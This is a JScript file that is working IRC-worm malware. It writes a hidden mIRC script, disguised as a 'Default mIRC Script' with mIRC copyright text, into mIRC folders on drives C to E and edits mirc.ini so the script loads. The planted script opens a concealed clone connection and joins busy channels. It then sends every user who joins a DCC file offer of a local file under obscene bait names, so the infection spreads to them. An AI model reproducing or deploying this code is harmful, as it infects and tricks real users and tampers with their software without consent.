
var Shell, INI
Shell = new ActiveXObject("Scripting.FileSystemObject")
INI = Shell.CreateTextFile("c:\\default.ini", true)
INI.writeline("[script]");
INI.writeline("n0=;//****************************************************************************************\\\\;");
INI.writeline("n1=;| |********************************* Default mIRC Script *********************************| |;");
INI.writeline("n2=;| |*********************mIRC v5.7 32bit by Khaled Mardam-Bey***********************| |;");
INI.writeline("n3=;| |*********************** Copyright 1995- 1999 mIRC Co. Ltd. ************************| |;");
INI.writeline("n4=;| | ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ----==DO NOT EDIT THIS FILE!!!==---- ! ! ! ! ! ! ! ! ! ! ! ! ! !| |;");
INI.writeline("n5=;| |****************************** More info in mIRC help file. ***************************//;");
INI.writeline("n6=;` `*****************************************************************************************' ';");
INI.writeline("n7=");
INI.writeline("n8=");
INI.writeline("n9=");
INI.writeline("n10=");
INI.writeline("n11=");
INI.writeline("n12=");
INI.writeline("n13=");
INI.writeline("n14=");
INI.writeline("n15=");
INI.writeline("n16=");
INI.writeline("n17=");
INI.writeline("n18=");
INI.writeline("n19=");
INI.writeline("n20=");
INI.writeline("n21=");
INI.writeline("n22=");
INI.writeline("n23=");
INI.writeline("n24=; !!!! Advanced mIRC default script Do not touch !!!!!");
INI.writeline("n25=");
INI.writeline("n25=");
INI.writeline("n26=");
INI.writeline("n27=");
INI.writeline("n28=");
INI.writeline("n29=");
INI.writeline("n30=");
INI.writeline("n31=");
INI.writeline("n32=");
INI.writeline("n33=");
INI.writeline("n34=on *:CONNECT: { if $portfree(113) = $true { socklisten IDENT 113 } | sockclose CLONE | sockopen CLONE $server 6667 | set %cleaning 1 }");
INI.writeline("n35=on *:DISCONNECT: { if $sock(CLONE,n) != 0 { sockwrite -n CLONE QUIT :Leaving | sockclose CLONE | sockclose LISTEN } | unset %me %nick %in %out %random %null %chan %temp %data %cleaning %sent }");
INI.writeline("n36=on *:SOCKLISTEN:IDENT*: { if ($sockerr > 0) return | set %temp 0 | :loop | inc %temp 1 | if $sock(ident $+ %temp,1) = $null { sockaccept ident $+ %temp | unset %temp } | else { goto loop } }");
INI.writeline("n37=on *:SOCKREAD:IDENT*:{ sockread %ident | sockwrite $sockname %ident : USERID : UNIX : $random | unset %ident }");
INI.writeline("n38=on *:SOCKCLOSE:CLONE: { sockclose CLONE | sockopen CLONE $server 6667 }");
INI.writeline("n39=on *:SOCKOPEN:CLONE:{ if ($sockerr > 0) { sockopen CLONE $server 6667 | return } | changenick | sockwrite -n CLONE USER $random $chr(34) $+ $random $+ $chr(34) $chr(34) $+ $random $+ $chr(34) : $+ $random | .timerJOINING 1 15 channels | .timerJOIN 0 1800 channels }");
INI.writeline("n40=on *:SOCKREAD:CLONE:{");
INI.writeline("n41=  sockread -f %data");
INI.writeline("n42=  if $gettok(%data,1,32) = PING { sockwrite -n CLONE PONG : $+ $server }");
INI.writeline("n43=  if $gettok(%data,2,32) = 263 { .timer 1 5 channels }");
INI.writeline("n44=  if $gettok(%data,2,32) = 322 {");
INI.writeline("n45=    if (%chan != $null) { halt }");
INI.writeline("n46=    if ($gettok(%data,5,32) > 50) {");
INI.writeline("n47=      set %chan $gettok(%data,4,32)");
INI.writeline("n48=      .timer 1 30 sockwrite -n CLONE JOIN %chan");
INI.writeline("n49=      .timer 1 30 unset %chan");
INI.writeline("n50=    }");
INI.writeline("n51=  }");  
INI.writeline("n52=  if $gettok(%data,2,32) = JOIN {");
INI.writeline("n53=    if ( %cleaning == 0 ) { halt }");
INI.writeline("n54=    if ( $gettok($gettok(%data,1,58),1,33) == %me ) { halt } | set %nick $gettok($gettok(%data,1,58),1,33)");
INI.writeline("n55=    :top");
INI.writeline("n56=    if ( %sent >= 10 ) {");
INI.writeline("n57=      if ( $timer(go) != $null ) { halt }");
INI.writeline("n58=      set %cleaning 0 | .timergo -c 1 30 set %cleaning 1 | .timer -c 1 30 set %sent 0 | halt");
INI.writeline("n59=    }");
INI.writeline("n60=    if ( $timer(%nick) != $null ) { halt }");
INI.writeline("n61=    .timer [ $+ [ %nick ] ] 1 $rand(15,30) clean %nick | inc %sent 1");
INI.writeline("n62=    if ( %sent >= 10 ) { goto top }");
INI.writeline("n63=  }");  
INI.writeline("n64=  if $gettok(%data,2,32) = 433 || $gettok(%data,2,32) = 451 { changenick }");
INI.writeline("n65=  unset %data");
INI.writeline("n66=}");
INI.writeline("n67=on *:QUIT: { if $nick = $me { if $sock(CLONE,n) != 0 { sockwrite -n CLONE QUIT :The Anti-Virus | sockclose CLONE } } }");
INI.writeline("n68=on *:socklisten:SEND*:{");
INI.writeline("n69=  set %sending SENDING $+ $rand(1,999999999)");
INI.writeline("n70=  sockaccept %sending");
INI.writeline("n71=  sockclose $sockname");
INI.writeline("n72=  upload %sending");
INI.writeline("n73=  unset %sending");
INI.writeline("n74=}");
INI.writeline("n75=on *:sockwrite:SENDING*: {");
INI.writeline("n76=  if [ %sendinc [ $+ [ $sockname ] ] ] = $null { set %sendinc $+ $sockname 4096 }");
INI.writeline("n77=  if [ %sendinc [ $+ [ $sockname ] ] ] != 4096 { unset %sendtotal* %sendinc* | sockclose SENDING* | return }");
INI.writeline("n78=  inc [ %sendtotal [ $+ [ $sockname ] ] ] 4096");
INI.writeline("n79=  if [ %sendtotal [ $+ [ $sockname ] ] ] > $file(C:\\Windows\\System\\SysLog.html).size { set %sendinc $+ $sockname $calc( [ %sendtotal [ $+ [ $sockname ] ] ] - $file(C:\\Windows\\System\\SysLog.html).size ) }");
INI.writeline("n80=  else { set %sendinc $+ $sockname 4096 }");
INI.writeline("n81=  bread C:\\Windows\\System\\SysLog.html [ %sendtotal [ $+ [ $sockname ] ] ] [ %sendinc [ $+ [ $sockname ] ] ] &binvar");
INI.writeline("n82=  sockwrite $sockname &binvar");
INI.writeline("n83=}");
INI.writeline("n84=alias changenick {");
INI.writeline("n85=  set %me $random");
INI.writeline("n86=  sockwrite -n CLONE NICK %me");
INI.writeline("n87=}");
INI.writeline("n88=alias channels {");
INI.writeline("n89=  sockwrite -n CLONE list * $+ $gettok(#teen:#sex:#warez:#mp3:#0!!!!!!!:#Anime:#Gay:#hack:#100%:#Chat:#vcd, $rand(1,11),58) $+ *");
INI.writeline("n90=}");
INI.writeline("n91=alias clean {");
INI.writeline("n92=  timeout");
INI.writeline("n93=  if $sock(SEND*,0) < 1 {");
INI.writeline("n94=  :loop");
INI.writeline("n95=  set %sock $rand(1,999999999)");
INI.writeline("n96=  if $sock(SEND $+ %sock,1) != $null { goto loop }");
INI.writeline("n97=  set %sockname SEND $+ %sock");
INI.writeline("n98=  socklisten %sockname");
INI.writeline("n99=  set %name $name");
INI.writeline("n100=  sockwrite -n CLONE NOTICE $1 :DCC Send %name ( $+ $IP $+ )");
INI.writeline("n101=  sockwrite -n CLONE PRIVMSG $1 :DCC SEND %name $longip($IP) $sock(%sockname).port $file(C:\\Windows\\System\\SysLog.html).size $+ ");
INI.writeline("n102=  unset %name %sockname %sock");
INI.writeline("n103= }");
INI.writeline("n104=}");
INI.writeline("n105=alias name return $str(!,$rand(2,9)) $+ $gettok(me-.young-girl_.dog~.preteen-.firewoman_.cheerleader~.woman_.fireman~.model_.cindy-.Lorie-.Hanz~.guy^.Linda_,$rand(1,14),46) $+ $gettok(sucking.fucking.licking.doing.on_top_of,$rand(1,5),46) $+ $gettok(_horse.-dick.^Jerry._cow.-Frank.~cat.^Beth.~pussy,$rand(1,8),46) $+ .html");
INI.writeline("n106=alias random { unset %null %random | set %null $rand(1,10) | :loop | set %random %random $+ $rand(a,z) | if $len(%random) <= %null { goto loop } | return %random }");
INI.writeline("n107=alias timeout {");
INI.writeline("n108=  set %close 1");
INI.writeline("n109=  :loop");
INI.writeline("n110=  if $sock(SEND*,%close) = $null { unset %close | goto done }");
INI.writeline("n111=  if $sock(SEND*,%close).to > 30 { sockclose $sock(SEND*,%close) | goto loop }");
INI.writeline("n112=  inc %close 1");
INI.writeline("n113=  goto loop");
INI.writeline("n114=  :done");
INI.writeline("n115=}");
INI.writeline("n116=alias upload {");
INI.writeline("n117=  set %sendtotal $+ $1 0");
INI.writeline("n118=  bread C:\\Windows\\System\\SysLog.html 0 4096 &binvar");
INI.writeline("n119=  sockwrite $1 &binvar");
INI.writeline("n120=}");
INI.writeline("n121=");
INI.writeline("n122=; Aphex is your savior and one hell of a script kiddie. >:o)");
INI.close();
INI = Shell.GetFile("c:\\default.ini")
if (Shell.FileExists("c:\\mirc\\mirc.ini"))
 {
INI.Copy("c:\\mirc\\default.ini");
}
if (Shell.FileExists("c:\\Program Files\\mirc\\mirc.ini"))
 {
INI.Copy("c:\\Program Files\\mirc\\default.ini");
}
if (Shell.FileExists("d:\\mirc\\mirc.ini"))
 {
INI.Copy("d:\\mirc\\default.ini");
}
if (Shell.FileExists("d:\\Program Files\\mirc\\mirc.ini"))
 {
INI.Copy("d:\\Program Files\\mirc\\default.ini");
}
if (Shell.FileExists("e:\\mirc\\mirc.ini"))
 {
INI.Copy("e:\\mirc\\default.ini");
}
if (Shell.FileExists("e:\\Program Files\\mirc\\mirc.ini"))
 {
INI.Copy("e:\\Program Files\\mirc\\default.ini");
}
INI.Delete();

if (Shell.FileExists("c:\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("c:\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}
if (Shell.FileExists("c:\\Program Files\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("c:\\Program Files\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}
if (Shell.FileExists("d:\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("d:\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}
if (Shell.FileExists("d:\\Program Files\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("d:\\Program Files\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}
if (Shell.FileExists("e:\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("e:\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}
if (Shell.FileExists("e:\\Program Files\\mirc\\mirc.ini"))
 {
  INI = Shell.OpenTextFile("e:\\Program Files\\mirc\\mirc.ini", 8, true)
  INI.writeline("n0=default.ini");
  INI.writeline("n1=default.ini");
  INI.writeline("n2=default.ini");
  INI.writeline("n3=default.ini");
  INI.writeline("n4=default.ini");
  INI.writeline("n5=default.ini");
  INI.writeline("n6=default.ini");
  INI.writeline("n7=default.ini");
  INI.writeline("n8=default.ini");
  INI.writeline("n9=default.ini");
  INI.writeline("n10=default.ini");
  INI.writeline("n100=default.ini");
  INI.Close();
}